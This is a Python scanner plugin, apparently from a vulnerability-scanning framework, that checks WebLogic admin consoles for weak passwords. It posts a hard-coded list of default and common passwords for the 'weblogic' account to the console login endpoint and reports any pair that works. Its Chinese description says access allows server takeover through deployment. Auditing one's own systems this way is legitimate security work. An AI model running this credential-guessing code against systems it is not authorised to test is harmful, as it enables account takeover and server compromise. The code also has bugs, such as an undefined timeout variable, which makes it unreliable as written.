#coding:utf-8
import urllib.request as ur

def get_plugin_info():
    plugin_info = {
        "name": "Weblogic弱口令",
        "info": "攻击者通过此漏洞可以登陆管理控制台，通过部署功能可直接获取服务器权限。",
        "level": "高危",
        "type": "弱口令",
        "author": "wolf@YSRC",
        "url": "http://jingyan.baidu.com/article/c74d6000650d470f6b595d72.html",
        "keyword": "tag:weblogic",
        "source": 1
    }
    return plugin_info

def check_path(check_url):
    try:
        res = ur.urlopen(check_url, timeout=timeout)
        return 1
    except Exception as e:
        if "405" in str(e) :
            return 1
        else : return 0


def check(url, timeout):
    login_url = url + '/console/j_security_check'
    if check_path(login_url) == 1:
        flag_list=['<title>WebLogic Server Console</title>','javascript/console-help.js','WebLogic Server Administration Console Home','/console/console.portal','console/jsp/common/warnuserlockheld.jsp','/console/actions/common/']
        user_list=['weblogic']
        pass_list=['weblogic','password','Weblogic1','weblogic10','weblogic10g','weblogic11','weblogic11g','weblogic12','weblogic12g','weblogic13','weblogic13g','weblogic123','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
        opener = ur.build_opener(ur.HTTPCookieProcessor())
        for user in user_list:
            for password in pass_list:
                PostStr = 'j_username=%s&j_password=%s&j_character_encoding=UTF-8'%(user,password)
                request = opener.open(login_url,PostStr,timeout=timeout)
                res_html = request.read()
                for flag in flag_list:
                    if flag in res_html:
                        info = u'[+] %s/console 账号：%s，密码：%s'%(url,user,password)
                        return info
    else : return